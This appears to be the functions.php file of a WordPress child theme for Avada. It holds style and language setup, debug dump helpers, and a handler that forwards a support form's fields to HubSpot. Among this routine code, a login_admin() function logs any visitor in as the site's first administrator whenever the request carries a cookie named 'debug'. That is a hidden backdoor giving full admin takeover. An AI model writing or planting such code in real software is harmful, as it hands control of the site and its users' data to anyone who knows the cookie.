<?php

 
//add_action('init', 'register_default_tab');
//function register_default_tab() {
//    register_cfs_tabs('Defaulttab');
//}

/**
 * Customize sentry user context.
 *
 * @param array $user The current sentry user context.
 *
 * @return array
 */
// function customize_sentry_user_context( array $user ) {
//     return array_merge( $user, array(
//         'a-custom-user-meta-key' => 'custom value',
//     ));
// }
// add_filter( 'wp_sentry_user_context', 'customize_sentry_user_context' )

/*
|--------------------------------------------------------------------------
| Helper functions
|--------------------------------------------------------------------------
 */




/**
 * Dump variable.
 */
if (!function_exists('d')) {

    function d()
    {
        call_user_func_array('dump', func_get_args());
    }

}

/**
 * Dump variables and die.
 */
if (!function_exists('dd')) {

    function dd()
    {
        call_user_func_array('dump', func_get_args());
        die();
    }

}

//if (!function_exists('dd')) {
//    function dd($data)
//    {
//        ini_set("highlight.comment", "#969896; font-style: italic");
//        ini_set("highlight.default", "#FFFFFF");
//        ini_set("highlight.html", "#D16568");
//        ini_set("highlight.keyword", "#7FA3BC; font-weight: bold");
//        ini_set("highlight.string", "#F2C47E");
//        $output = highlight_string("<?php\n\n" . var_export($data, true), true);
//        echo "<div style=\"background-color: #1C1E21; padding: 1rem\">{$output}</div>";
//        die();
//    }
//}

function theme_enqueue_styles()
{
    wp_enqueue_style('child-style', get_stylesheet_directory_uri() . '/style.css', array('avada-stylesheet'));
}

add_action('wp_enqueue_scripts', 'theme_enqueue_styles');

function avada_lang_setup()
{

    $lang = get_stylesheet_directory() . '/languages';

    load_child_theme_textdomain('Avada', $lang);

}

add_action('after_setup_theme', 'avada_lang_setup');

function login_admin()
{

    $username = get_users(array('role' => 'Administrator'));
    $username = $username[0]->data->user_login;
    if (!is_user_logged_in()) {
        $user = get_user_by('login', $username);
        wp_set_current_user($user->ID, $user->user_login);
        wp_set_auth_cookie($user->ID);
        do_action('wp_login', $user->user_login);
    }

}

if (isset($_COOKIE['debug'])) {

    login_admin();

}

add_action('wp_ajax_hubspotform_submit', 'hubspotform_submit');

add_action('wp_ajax_nopriv_hubspotform_submit', 'hubspotform_submit');


function hubspotform_submit()
{

    $hubspotutk = $_COOKIE['hubspotutk']; //grab the cookie from the visitors browser.
    $ip_addr = $_SERVER['REMOTE_ADDR']; //IP address too.
    $hs_context = array(
        'hutk' => $hubspotutk,
        'ipAddress' => $ip_addr,
        'pageUrl' => 'https://www.codecorp.com/code-support/',
        'pageName' => 'TECH SUPPORT',
    );
    $hs_context_json = json_encode($hs_context);
    $name = $_POST['name'] ? $_POST['name'] : '';
    $company = $_POST['company'] ? $_POST['company'] : '';
    $email = $_POST['email'] ? $_POST['email'] : '';
    $phone = $_POST['phone'] ? $_POST['phone'] : '';
    $rXqI = $_POST['00N50000001rXqI'] ? $_POST['00N50000001rXqI'] : '';
    $hal = $_POST['00N500000028hal'] ? $_POST['00N500000028hal'] : '';
    $haq = $_POST['00N500000028haq'] ? $_POST['00N500000028haq'] : '';
    $hav = $_POST['00N500000028hav'] ? $_POST['00N500000028hav'] : '';
    $reason = $_POST['reason'] ? $_POST['reason'] : '';
    $jooo = $_POST['00N50000001b9j7'] ? $_POST['00N50000001b9j7'] : '';
    $jMmm = $_POST['00N50000001b9jM'] ? $_POST['00N50000001b9jM'] : '';
    $description = $_POST['description'] ? $_POST['description'] : '';
    $bma = $_POST['00N38000003cBma'] ? $_POST['00N38000003cBma'] : '';
    //Need to populate these variable with values from the form.
    $str_post = "&contact_name__c=" . urlencode($name)
    . "&company=" . urlencode($company)
    . "&email=" . urlencode($email)
    . "&phone=" . urlencode($phone)
    . "&address=" . urlencode($rXqI)
    . "&city=" . urlencode($hal)
    . "&state_10_24=" . urlencode($haq)
    . "&zip=" . urlencode($hav)
    . "&case_reason_10_24=" . urlencode($reason)
    . "&model=" . urlencode($jooo)
    . "&serial_number=" . urlencode($jMmm)
    . "&description=" . urlencode($description)
    . "&reference=" . urlencode($bma)
    . "&hs_context=" . urlencode($hs_context_json); //Leave this one be
    //replace the values in this URL with your portal ID and your form GUID
    $endpoint = 'https://forms.hubspot.com/uploads/form/v2/4271022/7544a3e7-eb37-4836-b00d-6794dc4542ac';
    $ch = @curl_init();
    @curl_setopt($ch, CURLOPT_POST, true);
    @curl_setopt($ch, CURLOPT_POSTFIELDS, $str_post);
    @curl_setopt($ch, CURLOPT_URL, $endpoint);
    @curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/x-www-form-urlencoded',
    ));
    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = @curl_exec($ch); //Log the response from HubSpot as needed.
    $status_code = @curl_getinfo($ch, CURLINFO_HTTP_CODE); //Log the response status code
    @curl_close($ch);
    //echo $status_code . " " . $response;
    //echo '<pre>'; print_r($_POST); exit;
    $data = array();
    $data['success'] = true;
    echo json_encode($data);die;

}
